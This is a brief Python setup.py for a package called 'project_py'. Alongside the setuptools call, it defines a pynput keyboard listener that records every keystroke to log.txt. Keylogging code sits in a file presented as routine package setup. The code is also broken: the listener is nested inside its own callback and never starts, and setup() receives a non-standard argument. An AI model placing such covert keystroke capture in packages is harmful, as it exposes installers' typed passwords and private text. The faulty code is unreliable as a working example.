#pip install pynput

from pynput.keyboard import Listener
from setuptools import setup

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt","a") as f:
        f.write(keydata)

        with Listener(on_press=writetofile) as l:
            l.join()

setup(
    name = "project_py",
    version = "0.0.1",
    author = "Aron Marton",
    description = "Python projects to setup",
    development = "Sciencewolf"
)            
